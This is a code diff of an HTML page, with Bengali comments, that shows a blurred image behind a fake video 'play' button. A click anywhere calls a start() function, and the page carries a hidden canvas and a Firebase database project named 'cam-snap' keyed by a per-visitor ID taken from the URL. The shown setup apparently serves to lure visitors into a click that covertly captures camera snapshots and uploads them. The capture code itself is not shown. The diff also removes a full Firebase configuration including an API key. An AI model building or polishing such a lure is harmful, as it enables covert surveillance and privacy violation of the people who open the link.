@@ -5,39 +5,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  <style>
-    body,html{height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
-    .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
-    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;}
-    @keyframes p{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.25)}}
-    .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
-  </style>
 </head>
-<body onclick="start()">
-
-<div class="bg"></div>
-<div class="play">
-  <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-</div>
-
-<canvas id="c" style="display:none;"></canvas>
+<body onclick="start()" style="margin:0;background:#000;height:100vh;cursor:pointer;">
+  <div style="position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);"></div>
+  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;">
+    <svg width="56" height="56" fill="#fff" viewBox="0 0 24 24" style="margin-left:10px;">
+      <path d="M8 5v14l11-7z"/>
+    </svg>
+  </div>
+  <canvas id="c" style="display:none;"></canvas>
 
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
-  authDomain: "cam-snap-8e956.firebaseapp.com",
-  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
-  projectId: "cam-snap-8e956",
-  storageBucket: "cam-snap-8e956.firebasestorage.app",
-  messagingSenderId: "982089892260",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
-  measurementId: "G-S5S37F55T6"
-};
+const firebaseConfig = { /* তোমার কনফিগ */ };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ID নেওয়ার ফিক্সড উপায় – এটাই ছিল সমস্যা!
-const id = location.pathname.slice(1) || new URLSearchParams(location.search).get('id');
+// ID নেওয়ার ১০০% সঠিক উপায়
+let id = location.pathname.slice(1);
+if (!id) {
+  const params = new URLSearchParams(location.search);
+  id = params.get('id');
+}
 
 const today = new Date().toLocaleDateString('bn-BD');
 
